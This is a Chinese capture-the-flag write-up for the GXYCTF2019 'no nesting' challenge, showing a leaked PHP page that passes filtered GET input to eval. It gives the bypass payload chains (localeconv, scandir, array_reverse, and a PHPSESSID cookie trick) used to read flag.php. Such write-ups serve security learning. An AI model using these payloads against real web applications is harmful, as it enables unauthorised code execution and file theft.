# [GXYCTF2019]禁止套娃 无回显 RCE 过滤__FILE__ dirname等

扫除git

通过githack

获取index.php

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

发现是命令执行并且存在过滤

我们之前使用的 print_r(dirname(__FILE__));

在这里不可以使用

## 1.localeconv()

直接上payload了

```scss
print_r(localeconv());
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5cc02559cc53ca9603642f38910c5616.png" alt="" style="max-height:147px; box-sizing:content-box;" />


通过current指定第一个 .

```perl
?exp=print_r(current(localeconv()));
```

这样我们配合 scandir 就可以实现 scandir('.')了

```perl
?exp=print_r(scandir(current(localeconv())));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/56bd9c8d9076ab112903f7758aeeb77f.png" alt="" style="max-height:149px; box-sizing:content-box;" />


这里我们无法使用[] 所以我们可以通过 array_reverse 倒序数组然后next即可

```perl
?exp=print_r(next(array_reverse(scandir(current(localeconv())))));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/445132e5f0a497030d2f5c0d12c88c01.png" alt="" style="max-height:172px; box-sizing:content-box;" />


```cobol
/?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

## 2.seesion_id

正常情况下 不开启 seesion 服务 但是如果我们可以通过 seesion_start()开启

我们就可以通过 seesion传递值

```cobol
?exp=print_r(session_id(session_start()))
 
 
bp中加
 
Cookie: PHPSESSID=flag.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/43c31369c3464d2b6542971c8dfff498.png" alt="" style="max-height:330px; box-sizing:content-box;" />


然后一样通过 highlight_file即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/8b1c14e39250851b52ebe7745f8eff01.png" alt="" style="max-height:546px; box-sizing:content-box;" />